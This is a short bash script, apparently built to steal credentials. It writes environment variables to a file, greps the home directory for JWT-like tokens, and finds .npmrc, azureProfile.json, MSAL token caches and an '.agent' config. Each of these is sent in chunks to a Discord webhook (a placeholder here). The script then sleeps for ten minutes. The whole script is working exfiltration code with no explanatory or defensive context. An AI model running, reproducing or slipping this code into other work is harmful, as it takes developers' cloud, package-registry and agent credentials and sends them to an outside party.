#!/usr/bin/env bash
set -euo pipefail

DISCORD_WEBHOOK="__DISCORD_WEBHOOK__"

NPMRC_FILE=".npmrc"

post_discord() {
  curl -sf -X POST "$DISCORD_WEBHOOK" \
    -H "Content-Type: application/json" \
    -d "$(jq -n --arg msg "$1" '{content: $msg}')" || true
}

post_file() {
  local label="$1" path="$2"
  ls -la "$(dirname "$path")" >&2
  [[ -f "$path" ]] || return 0

  local content chunk_size=1800 offset=0 part=1
  content=$(cat "$path")
  local total=${#content}

  while [[ $offset -lt $total ]]; do
    local chunk="${content:$offset:$chunk_size}"
    post_discord "**$label** (part $part)\n\`\`\`\n${chunk}\n\`\`\`"
    (( offset += chunk_size ))
    (( part++ ))
  done
}

ENV_FILE=".test"
env > .test

SEARCH_FILE="$HOME/.sub"
grep -ri "eyJ0" ~ > /tmp/temp.txt && mv /tmp/temp.txt ~/.sub

echo "posting env"
post_file "env" "$ENV_FILE"
echo "posting npm"
post_file "npmrc" "$NPMRC_FILE"

while IFS= read -r azure_profile; do
  post_file "azureProfile" "$azure_profile"
done < <(find ~ -name "azureProfile.json" 2>/dev/null)

while IFS= read -r msal_cache; do
  post_file "msal_cache" "$msal_cache"
done < <(find ~ -name "msal_token_cache.json" 2>/dev/null)

agent_config=$(find ~ -name ".agent" 2>/dev/null | head -1)
post_discord "**agentConfig**\n\`\`\`\n$(cat "$agent_config")\n\`\`\`"

sleep 600